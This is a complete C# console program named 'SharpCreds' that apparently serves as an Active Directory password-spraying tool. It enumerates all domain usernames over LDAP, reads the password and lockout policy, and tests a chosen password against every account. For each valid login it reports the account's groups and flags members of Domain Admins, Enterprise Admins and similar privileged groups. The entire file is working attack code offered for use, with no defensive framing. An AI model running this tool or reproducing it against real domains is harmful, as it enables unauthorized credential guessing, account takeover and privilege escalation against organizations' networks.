using System;
using System.Collections.Generic;
using System.DirectoryServices;
using System.DirectoryServices.AccountManagement;
using System.Linq;


class Program
{
    static void Main()
    {
        Console.WriteLine("Welcome to SharpCreds");
        Console.WriteLine();

        while (true)
        {
            Console.Write("Enter the domain name: ");
            string domainName = Console.ReadLine();

            Console.Write("Enter the username: ");
            string username = Console.ReadLine();

            Console.Write("Enter the password: ");
            string password = ReadPassword();

            if (AuthenticateUser(domainName, username, password))
            {
                Console.WriteLine();
                Console.WriteLine("Authentication successful!");
                Console.WriteLine("Generating list of usernames...");
                Console.WriteLine();

                List<string> usernames = new List<string>();

                while (true)
                {
                    Console.WriteLine("Choose an option:");
                    Console.WriteLine("1. Generate usernames using LDAP query");
                    Console.WriteLine("2. Provide usernames from a file");
                    Console.WriteLine("3. Enumerate domain password policy");
                    Console.WriteLine("4. Quit");
                    Console.WriteLine();
                    Console.Write("Enter your choice: ");

                    string option = Console.ReadLine();

                    switch (option)
                    {
                        case "1":
                            Tuple<int, List<string>> result = GenerateUsernames(domainName, username, password);
                            usernames = result.Item2;
                            int count = result.Item1;
                            Console.WriteLine($"List of {count} usernames generated successfully.");

                            Console.WriteLine();
                            Console.Write("Do you want to save a copy of the username list? (Y/N): ");
                            string saveCopyOption = Console.ReadLine();

                            if (saveCopyOption.Equals("Y", StringComparison.OrdinalIgnoreCase))
                            {
                                Console.Write("Enter the file name to save the usernames (without extension): ");
                                string fileName = Console.ReadLine();

                                string filePath = $"{AppDomain.CurrentDomain.BaseDirectory}{fileName}.txt";

                                try
                                {
                                    System.IO.File.WriteAllLines(filePath, usernames);
                                    Console.WriteLine($"Usernames saved successfully to {filePath}");
                                }
                                catch (Exception ex)
                                {
                                    Console.WriteLine($"Error saving usernames to file: {ex.Message}");
                                }
                            }

                            Console.WriteLine();
                            Console.Write("Press Enter to continue...");
                            Console.ReadLine();

                            break;

                        case "2":
                            usernames = ReadUsernamesFromFile();
                            Console.WriteLine("Usernames loaded successfully.");
                            break;
                        case "3":
                            EnumerateDomainPasswordPolicy(domainName, username, password);
                            break;
                        case "4":
                            return;
                        default:
                            Console.WriteLine("Invalid option. Please try again.");
                            continue;
                    }

                    Console.WriteLine();

                    while (true)
                    {
                        Console.Write("Enter a password to try against the usernames ('b' to return to the original menu or 'q' to quit): ");
                        string input = Console.ReadLine();

                        if (input == "q")
                            return;

                        if (input == "b")
                            break;

                        Console.WriteLine();
                        Console.ForegroundColor = ConsoleColor.Green;
                        Console.WriteLine("Usernames that match the provided password...");
                        Console.ResetColor();

                        List<string> validCredentials = new List<string>();

                        foreach (string user in usernames)
                        {
                            if (AuthenticateUser(domainName, user, input))
                            {
                                Console.WriteLine($"Valid credentials: {domainName}\\{user}");
                                validCredentials.Add(user);
                            }
                        }

                        Console.WriteLine();
                        Console.ForegroundColor = ConsoleColor.Blue;
                        Console.WriteLine("Retrieving domain groups for valid credentials...");
                        Console.ResetColor();

                        foreach (string validUser in validCredentials)
                        {
                            List<string> groups = GetDomainGroups(domainName, validUser, username, password);
                            if (groups.Count > 0)
                            {
                                string groupNames = string.Join(", ", groups);
                                Console.WriteLine($"{domainName}\\{validUser} - {groupNames}");
                            }
                            else
                            {
                                Console.WriteLine($"{domainName}\\{validUser} - No domain groups found.");
                            }
                        }

                        Console.WriteLine();

                        // Check for high privileged accounts
                        Dictionary<string, List<string>> highPrivilegedAccounts = new Dictionary<string, List<string>>();

                        foreach (string validUser in validCredentials)
                        {
                            Dictionary<string, List<string>> matchedAccounts = IsHighPrivilegedAccount(domainName, validUser, username, password);
                            foreach (var entry in matchedAccounts)
                            {
                                string user = entry.Key;
                                List<string> matchedGroups = entry.Value;

                                if (highPrivilegedAccounts.ContainsKey(user))
                                {
                                    highPrivilegedAccounts[user].AddRange(matchedGroups);
                                }
                                else
                                {
                                    highPrivilegedAccounts[user] = matchedGroups;
                                }
                            }
                        }

                        // Display high privileged accounts
                        if (highPrivilegedAccounts.Count > 0)
                        {
                            Console.ForegroundColor = ConsoleColor.Yellow;
                            Console.WriteLine("High Privileged Accounts:");
                            Console.ResetColor();
                            foreach (var entry in highPrivilegedAccounts)
                            {
                                string user = entry.Key;
                                List<string> matchedGroups = entry.Value;

                                string groupNames = string.Join(", ", matchedGroups);
                                Console.WriteLine($"{domainName}\\{user} - {groupNames}");
                            }
                            Console.WriteLine(); // Add this line to insert a blank line
                        }
                    }
                }
            }
            else
            {
                Console.WriteLine("Authentication failed. Invalid credentials.");
                Console.WriteLine("Please try again.");
            }

            Console.ReadLine();
        }

        static bool AuthenticateUser(string domainName, string username, string password)
        {
            try
            {
                using (DirectoryEntry directoryEntry = new DirectoryEntry($"LDAP://{domainName}", username, password))
                {
                    object nativeObject = directoryEntry.NativeObject;
                }

                return true;
            }
            catch
            {
                return false;
            }
        }

        static Tuple<int, List<string>> GenerateUsernames(string domainName, string username, string password)
        {
            List<string> usernames = new List<string>();

            try
            {
                using (DirectoryEntry entry = new DirectoryEntry($"LDAP://{domainName}", username, password))
                {
                    using (DirectorySearcher searcher = new DirectorySearcher(entry))
                    {
                        searcher.Filter = "(&(objectCategory=user))";
                        searcher.PropertiesToLoad.Add("sAMAccountName");

                        searcher.PageSize = 1000; // Set a higher page size to retrieve more results

                        using (SearchResultCollection results = searcher.FindAll())
                        {
                            foreach (SearchResult result in results)
                            {
                                string usernameProperty = result.Properties["sAMAccountName"][0].ToString();
                                usernames.Add(usernameProperty);
                            }
                        }
                    }
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error generating list of usernames: {ex.Message}");
            }

            return new Tuple<int, List<string>>(usernames.Count, usernames);
        }


        static List<string> GetDomainGroups(string domainName, string username, string adminUsername, string adminPassword)
        {
            List<string> groups = new List<string>();

            try
            {
                using (PrincipalContext context = new PrincipalContext(ContextType.Domain, domainName, adminUsername, adminPassword))
                {
                    using (UserPrincipal userPrincipal = UserPrincipal.FindByIdentity(context, IdentityType.SamAccountName, username))
                    {
                        if (userPrincipal != null)
                        {
                            PrincipalSearchResult<Principal> principalSearchResult = userPrincipal.GetAuthorizationGroups();

                            foreach (Principal principal in principalSearchResult)
                            {
                                if (principal is GroupPrincipal groupPrincipal)
                                {
                                    groups.Add(groupPrincipal.SamAccountName);
                                }
                            }
                        }
                    }
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error retrieving domain groups: {ex.Message}");
            }

            return groups;
        }

        static Dictionary<string, List<string>> IsHighPrivilegedAccount(string domainName, string username, string adminUsername, string adminPassword)
        {
            Dictionary<string, List<string>> highPrivilegedAccounts = new Dictionary<string, List<string>>();

            List<string> privilegedGroups = new List<string>
        {
            "Administrators",
            "Schema Admins",
            "Enterprise Admins",
            "Domain Admins"
        };

            try
            {
                using (PrincipalContext context = new PrincipalContext(ContextType.Domain, domainName, adminUsername, adminPassword))
                {
                    using (UserPrincipal userPrincipal = UserPrincipal.FindByIdentity(context, IdentityType.SamAccountName, username))
                    {
                        if (userPrincipal != null)
                        {
                            PrincipalSearchResult<Principal> principalSearchResult = userPrincipal.GetAuthorizationGroups();

                            foreach (Principal principal in principalSearchResult)
                            {
                                if (principal is GroupPrincipal groupPrincipal)
                                {
                                    if (privilegedGroups.Contains(groupPrincipal.SamAccountName))
                                    {
                                        if (highPrivilegedAccounts.ContainsKey(username))
                                        {
                                            highPrivilegedAccounts[username].Add(groupPrincipal.SamAccountName);
                                        }
                                        else
                                        {
                                            highPrivilegedAccounts[username] = new List<string> { groupPrincipal.SamAccountName };
                                        }
                                    }
                                }
                            }
                        }
                    }
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error checking high privileged accounts: {ex.Message}");
            }

            return highPrivilegedAccounts;
        }

        static List<string> ReadUsernamesFromFile()
        {
            Console.Write("Enter the path to the file containing usernames: ");
            string filePath = Console.ReadLine();

            List<string> usernames = new List<string>();

            try
            {
                usernames = System.IO.File.ReadAllLines(filePath).ToList();
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error reading usernames from file: {ex.Message}");
            }

            return usernames;
        }

        static void EnumerateDomainPasswordPolicy(string domainName, string username, string password)
        {
            Console.WriteLine();
            Console.WriteLine("Enumerating domain password policy...");
            Console.WriteLine();

            try
            {
                using (DirectoryEntry entry = new DirectoryEntry($"LDAP://{domainName}", username, password))
                {
                    using (DirectorySearcher searcher = new DirectorySearcher(entry))
                    {
                        searcher.Filter = "(objectClass=domain)";
                        searcher.PropertiesToLoad.Add("maxPwdAge");
                        searcher.PropertiesToLoad.Add("minPwdAge");
                        searcher.PropertiesToLoad.Add("lockoutThreshold");
                        searcher.PropertiesToLoad.Add("lockoutDuration");
                        searcher.PropertiesToLoad.Add("pwdHistoryLength");
                        searcher.PropertiesToLoad.Add("lockoutObservationWindow");

                        SearchResult result = searcher.FindOne();

                        if (result != null)
                        {
                            TimeSpan maxPwdAge = TimeSpan.FromTicks((long)result.Properties["maxPwdAge"][0]);
                            TimeSpan minPwdAge = TimeSpan.FromTicks((long)result.Properties["minPwdAge"][0]);
                            int lockoutThreshold = (int)result.Properties["lockoutThreshold"][0];
                            TimeSpan lockoutDuration = TimeSpan.FromTicks((long)result.Properties["lockoutDuration"][0]);
                            int pwdHistoryLength = (int)result.Properties["pwdHistoryLength"][0];
                            TimeSpan lockoutObservationWindow = TimeSpan.FromTicks((long)result.Properties["lockoutObservationWindow"][0]);

                            Console.ForegroundColor = ConsoleColor.Green;
                            Console.WriteLine("Domain Password Policy Information:");
                            Console.ResetColor();
                            Console.WriteLine();
                            Console.WriteLine($"Maximum Password Age: {maxPwdAge.Days} days");
                            Console.WriteLine($"Minimum Password Age: {minPwdAge.Days} days");
                            Console.WriteLine($"Enforce Password History: {pwdHistoryLength} passwords");
                            Console.WriteLine();
                            Console.ForegroundColor = ConsoleColor.Green;
                            Console.WriteLine("Domain Lockout Policy Information:");
                            Console.ResetColor();
                            Console.WriteLine();
                            Console.WriteLine($"Lockout Threshold: {lockoutThreshold} invalid attempts");
                            Console.WriteLine($"Lockout Duration: {lockoutDuration.TotalMinutes} minutes");
                            Console.WriteLine($"Reset Account Lockout Counter After: {lockoutObservationWindow.TotalMinutes} minutes");
                        }
                        else
                        {
                            Console.WriteLine("Failed to retrieve domain password policy.");
                        }
                    }
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error enumerating domain password policy: {ex.Message}");
            }
        }

        static string ReadPassword()
        {
            string password = "";
            ConsoleKeyInfo key;

            do
            {
                key = Console.ReadKey(true);

                if (key.Key == ConsoleKey.Backspace && password.Length > 0)
                {
                    // Delete the last character
                    password = password.Substring(0, password.Length - 1);
                    Console.Write("\b \b"); // Clear the last character on the console
                }
                else if (key.Key != ConsoleKey.Enter)
                {
                    password += key.KeyChar;
                    Console.Write("*");
                }
            } while (key.Key != ConsoleKey.Enter);

            Console.WriteLine();
            return password;
        }

    }
}
